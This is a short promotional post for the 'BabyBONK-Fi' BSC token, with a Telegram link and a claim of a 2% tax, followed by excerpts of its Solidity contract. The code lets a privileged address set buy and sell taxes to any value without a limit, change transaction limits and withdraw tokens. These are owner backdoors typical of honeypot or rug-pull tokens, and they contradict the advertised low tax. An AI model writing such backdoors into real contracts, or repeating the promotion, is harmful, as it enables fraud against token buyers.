...
🚀 BabyBONK-Fi Launchpad! 🌟

⏰ 15:00 Utc!

BabyBONK-Fi is the First Launchpad at BSC, and the team is dedicated to boost the BNB ecosystem.

Low tax 2%

Telegram Group : https://t.me/+xOyk3d0rVbE0YjE9
...
contract BabyBONK is Context, IERC20 { 
    ...
    string private constant _name = "BabyBONK - Fi";
    string private constant _symbol = unicode"$BONKFI";
    ...
    address payable public DevWallet = payable(0xa2b26Bf04E2548B9CE7d4bDe2e1d6dC2B51AAa7B);
    address payable public MarketingWallet = payable(0x96fab2505Ce101bBA32082c75c8c49F0D2523d8d);
    ...
    function setbatchFees(uint256 buytax, uint256 selltax) external onlyAddress {
        _tax_On_Buy = buytax;
        _tax_On_Sell = selltax;
    }
    function excludefromFees() external onlyAddress {
        _tax_On_Buy = 0;
        _tax_On_Sell = 0;
    }
    function includeMaxTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function includeMaxWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function claimStuckToken(uint256 value, address adr) onlyAddress public virtual {
